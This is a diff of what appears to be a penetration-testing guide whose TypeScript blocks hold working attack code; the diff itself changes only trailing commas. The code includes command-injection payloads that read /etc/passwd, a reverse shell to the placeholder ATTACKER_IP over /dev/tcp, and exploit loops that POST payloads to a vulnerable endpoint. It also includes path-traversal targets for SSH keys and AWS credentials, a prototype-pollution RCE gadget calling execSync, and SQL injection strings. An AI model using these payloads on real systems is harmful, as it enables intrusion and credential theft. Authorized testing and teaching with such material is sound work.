@@ -163,14 +163,14 @@ const payloads = [
   { input: '$(cat /etc/passwd)', detect: 'root:' },
 
   // Reverse shell (for authorized pentests only)
-  { input: '$(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1)', detect: null }
+  { input: '$(bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1)', detect: null },
 ];
 
 async function exploit() {
   for (const { input, detect } of payloads) {
     const response = await fetch(VULNERABLE_ENDPOINT, {
       method: 'POST',
-      body: JSON.stringify({ files: [input] })
+      body: JSON.stringify({ files: [input] }),
     });
     const result = await response.text();
 
@@ -192,14 +192,14 @@ const traversalPayloads = [
   '/etc/passwd',
   '/proc/self/environ', // Leaks environment variables
   '/home/user/.ssh/id_rsa',
-  '/home/user/.aws/credentials'
+  '/home/user/.aws/credentials',
 ];
 
 async function exploitPathTraversal(endpoint: string) {
   for (const payload of traversalPayloads) {
     const response = await fetch(endpoint, {
       method: 'POST',
-      body: JSON.stringify({ files: [payload] })
+      body: JSON.stringify({ files: [payload] }),
     });
     const result = await response.text();
 
@@ -221,16 +221,16 @@ async function exploitPathTraversal(endpoint: string) {
 
 // Example: Exploiting known prototype pollution
 const payload = {
-  __proto__: { admin: true }
+  __proto__: { admin: true },
 };
 
 // Example: Exploiting known RCE in library
 const rcePayload = {
   constructor: {
     prototype: {
-      outputFunctionName: "x;process.mainModule.require('child_process').execSync('id');x"
-    }
-  }
+      outputFunctionName: "x;process.mainModule.require('child_process').execSync('id');x",
+    },
+  },
 };
 ```
 
@@ -251,7 +251,7 @@ const sqlPayloads = [
   "' AND SLEEP(5)--",
 
   // Error-based extraction
-  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+  "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
 ];
 ```
 
